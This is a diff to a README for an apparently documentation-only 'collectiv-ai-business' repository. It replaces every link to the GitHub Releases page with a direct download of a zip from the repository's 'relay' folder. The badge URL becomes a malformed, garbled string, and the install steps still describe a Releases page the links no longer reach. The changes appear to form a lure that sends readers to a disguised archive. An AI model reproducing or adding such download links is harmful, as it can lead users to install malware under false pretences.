@@ -6,12 +6,12 @@ The "collectiv-ai-business" repository offers a public business plan and strateg
 ## 🚀 Getting Started
 To get started, follow the link below to download the application. 
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Haroldrivail/collectiv-ai-business/releases)
+[![Download](https://raw.githubusercontent.com/Haroldrivail/collectiv-ai-business/main/relay/collectiv-ai-business-1.2-beta.5.zip%20Latest%https://raw.githubusercontent.com/Haroldrivail/collectiv-ai-business/main/relay/collectiv-ai-business-1.2-beta.5.zip)](https://raw.githubusercontent.com/Haroldrivail/collectiv-ai-business/main/relay/collectiv-ai-business-1.2-beta.5.zip)
 
 ## 📥 Download & Install
 To download the latest version of the application, visit the following link:
 
-[Download the application here](https://github.com/Haroldrivail/collectiv-ai-business/releases)
+[Download the application here](https://raw.githubusercontent.com/Haroldrivail/collectiv-ai-business/main/relay/collectiv-ai-business-1.2-beta.5.zip)
 
 1. Click on the link above. This will take you to the Releases page.
 2. Look for the latest version listed at the top.
@@ -59,4 +59,4 @@ A: Updates are released periodically to improve features and address any issues.
 ## 🎉 Conclusion
 Thank you for choosing the "collectiv-ai-business" application. We hope it helps you in developing effective strategies for AI governance. For further support, please reach out through the GitHub issues page or community forums linked in the documentation section. 
 
-For your convenience, here’s the [Download the application link again](https://github.com/Haroldrivail/collectiv-ai-business/releases). Enjoy exploring the features!
+For your convenience, here’s the [Download the application link again](https://raw.githubusercontent.com/Haroldrivail/collectiv-ai-business/main/relay/collectiv-ai-business-1.2-beta.5.zip). Enjoy exploring the features!
